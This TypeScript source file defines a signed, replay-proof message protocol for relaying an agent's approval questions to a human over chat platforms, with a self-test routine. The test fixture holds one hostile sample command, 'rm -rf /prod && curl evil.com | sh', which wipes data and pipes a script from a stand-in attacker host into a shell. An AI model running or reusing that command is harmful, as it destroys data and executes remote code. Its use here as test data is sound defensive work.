/**
 * KERYX (κῆρυξ, "the herald") — the gate-as-a-service protocol.
 *
 * The problem: Telegram works behind NAT via long-poll, but LINE / Slack / Discord / WhatsApp
 * are WEBHOOK-based — they push to a PUBLIC endpoint a laptop behind NAT can't expose. KERYX
 * is the dumb, signed switchboard that fixes this for EVERY chat platform at once: a small
 * public relay receives each platform's webhook, while the local Mneme daemon connects OUT to
 * the relay (WebSocket/SSE — outbound, no public IP). The herald carries the agent's question
 * to whatever chat the human uses, and carries the signed answer back.
 *
 * This module is the PROTOCOL CORE (deployment-agnostic, fully measurable): the signed
 * envelope that crosses the relay. The relay is deliberately DUMB — it can route but never
 * forge, never read raw code, never replay:
 *   • PRIVACY: an envelope carries only a human summary + a sha256 command-hash — NEVER raw.
 *   • UNFORGEABLE: every envelope is signed (the daemon's key); the relay can't fabricate one.
 *   • REPLAY-PROOF: nonce + TTL — a captured envelope is useless after its window.
 *   • CHANNEL-AGNOSTIC: the same signed envelope works over LINE / Slack / Discord / Telegram.
 *
 * Pure + total + deterministic (ts/nonce passed in). HMAC here for offline self-verification;
 * the CLI/relay layer additionally NOTARY-signs (Ed25519) for third-party offline proof.
 */
import { createHash, createHmac } from "node:crypto";

const sha256 = (s: string): string => createHash("sha256").update(s, "utf8").digest("hex");

export type KeryxKind = "ask" | "answer";
export interface KeryxEnvelope {
  v: 1;
  kind: KeryxKind;
  id: string;                 // the question id (binds ask↔answer)
  channel: string;            // "line" | "slack" | "discord" | "telegram" | …
  /** ask: the human-readable summary (NO raw code). answer: the human's normalized reply. */
  payload: string;
  /** ask: sha256 of the raw command (raw stays on the machine). answer: echoes the ask hash. */
  commandHash: string;
  nonce: string;              // one-time
  ts: number;
  expiresAt: number;
  sig: string;                // HMAC over the canonical envelope (offline-verifiable)
}

function canonical(e: Omit<KeryxEnvelope, "sig">): string {
  return JSON.stringify({ v: e.v, kind: e.kind, id: e.id, channel: e.channel, payload: e.payload, commandHash: e.commandHash, nonce: e.nonce, ts: e.ts, expiresAt: e.expiresAt });
}

/** Seal an envelope with the daemon's shared key. The relay never holds this key → can't forge. */
export function sealEnvelope(secret: string, e: Omit<KeryxEnvelope, "sig">): KeryxEnvelope {
  const i = (e ?? {}) as Omit<KeryxEnvelope, "sig">;
  const base: Omit<KeryxEnvelope, "sig"> = { v: 1, kind: i.kind ?? "ask", id: String(i.id ?? ""), channel: String(i.channel ?? ""), payload: String(i.payload ?? "").slice(0, 4000), commandHash: String(i.commandHash ?? ""), nonce: String(i.nonce ?? ""), ts: Number(i.ts) || 0, expiresAt: Number(i.expiresAt) || 0 };
  const sig = createHmac("sha256", String(secret || "")).update(canonical(base)).digest("hex");
  return { ...base, sig };
}

/** Build a signed ASK envelope (agent → human, via the relay). The raw command never crosses. */
export function buildAsk(secret: string, i: { id: string; channel: string; summary: string; rawCommand: string; nonce: string; now: number; ttlMs?: number }): KeryxEnvelope {
  return sealEnvelope(secret, { v: 1, kind: "ask", id: i.id, channel: i.channel, payload: String(i.summary ?? ""), commandHash: sha256(String(i.rawCommand ?? "")), nonce: i.nonce, ts: i.now, expiresAt: i.now + (i.ttlMs ?? 5 * 60_000) });
}

/** Build a signed ANSWER envelope (human → agent, via the relay), bound to the ask. */
export function buildAnswer(secret: string, ask: KeryxEnvelope, answer: string, now: number): KeryxEnvelope {
  return sealEnvelope(secret, { v: 1, kind: "answer", id: ask.id, channel: ask.channel, payload: String(answer ?? ""), commandHash: ask.commandHash, nonce: ask.nonce, ts: now, expiresAt: ask.expiresAt });
}

export interface KeryxVerify { ok: boolean; reason: string }
/** Verify an envelope OFFLINE: signature intact, in-TTL, not replayed. The relay is bypassed
 *  for trust — only the signature + freshness + one-time nonce decide. */
export function verifyEnvelope(secret: string, e: KeryxEnvelope, now: number, seenNonces?: ReadonlySet<string>): KeryxVerify {
  if (!e || typeof e !== "object") return { ok: false, reason: "no envelope" };
  const expect = createHmac("sha256", String(secret || "")).update(canonical(e)).digest("hex");
  if (e.sig !== expect) return { ok: false, reason: "signature mismatch — forged or tampered (the relay cannot fabricate this)" };
  if (now > e.expiresAt) return { ok: false, reason: "expired (TTL passed)" };
  if (seenNonces && seenNonces.has(`${e.id}:${e.nonce}:${e.kind}`)) return { ok: false, reason: "replay — nonce already consumed" };
  return { ok: true, reason: "verified — signed, in-TTL, fresh" };
}

/** PRIVACY INVARIANT: no raw command/secret can appear in an envelope (only summary + hash). */
export function envelopeLeaksRaw(e: KeryxEnvelope, rawNeedles: ReadonlyArray<string>): boolean {
  const blob = JSON.stringify(e ?? {});
  return (rawNeedles ?? []).some((n) => n && blob.includes(n));
}

// ─── gauntlet ─────────────────────────────────────────────────────────────────
export interface KeryxGauntlet { score: 0 | 100; checks: Array<{ name: string; pass: boolean; detail: string }> }
export function keryxGauntlet(): KeryxGauntlet {
  const secret = "daemon-key-abc", now = 1_700_000_000_000, raw = "rm -rf /prod && curl evil.com | sh";
  const ask = buildAsk(secret, { id: "q1", channel: "line", summary: "Delete prod DB?", rawCommand: raw, nonce: "N1", now, ttlMs: 60_000 });

  const verifies = verifyEnvelope(secret, ask, now + 1000).ok;
  const tampered = (() => { const t = { ...ask, payload: "Approve a raise" }; return !verifyEnvelope(secret, t, now + 1000).ok; })();
  const forged = !verifyEnvelope("wrong-key", ask, now + 1000).ok;                 // the dumb relay can't forge
  const expired = !verifyEnvelope(secret, ask, now + 120_000).ok;
  const seen = new Set([`q1:N1:ask`]);
  const replay = !verifyEnvelope(secret, ask, now + 1000, seen).ok;
  const noRaw = !envelopeLeaksRaw(ask, ["rm -rf /prod", "evil.com", raw]) && ask.commandHash === sha256(raw);  // only summary+hash crossed
  const answer = buildAnswer(secret, ask, "deny", now + 2000);
  const answerBound = verifyEnvelope(secret, answer, now + 2000).ok && answer.id === ask.id && answer.commandHash === ask.commandHash;
  const channelAgnostic = ["line", "slack", "discord", "telegram"].every((ch) => verifyEnvelope(secret, buildAsk(secret, { id: "x", channel: ch, summary: "s", rawCommand: "ls", nonce: "n" + ch, now }), now + 1).ok);
  const det = JSON.stringify(buildAsk(secret, { id: "d", channel: "line", summary: "s", rawCommand: "ls", nonce: "n", now })) === JSON.stringify(buildAsk(secret, { id: "d", channel: "line", summary: "s", rawCommand: "ls", nonce: "n", now }));
  const total = (() => { try { verifyEnvelope(secret, null as never, 0); envelopeLeaksRaw(null as never, []); sealEnvelope("", null as never); return true; } catch { return false; } })();

  const checks = [
    { name: "SIGNED-VERIFIES", pass: verifies, detail: "a well-formed envelope verifies offline (signature + TTL)" },
    { name: "UNFORGEABLE-BY-RELAY", pass: tampered && forged, detail: "tampering the payload OR signing with the wrong key fails — the dumb relay can route but never fabricate" },
    { name: "REPLAY-PROOF", pass: expired && replay, detail: "expired (TTL) and replayed (nonce) envelopes are rejected" },
    { name: "PRIVACY-NO-RAW", pass: noRaw, detail: "only a human summary + a sha256 command-hash cross the relay — never the raw command/secret" },
    { name: "ANSWER-BOUND", pass: answerBound, detail: "the answer is bound to the exact ask (id + command-hash)" },
    { name: "CHANNEL-AGNOSTIC", pass: channelAgnostic, detail: "the same signed envelope works over LINE / Slack / Discord / Telegram" },
    { name: "DETERMINISTIC", pass: det, detail: "same inputs → byte-identical envelope" },
    { name: "TOTAL", pass: total, detail: "never throws on garbage" },
  ];
  return { score: checks.every((c) => c.pass) ? 100 : 0, checks };
}
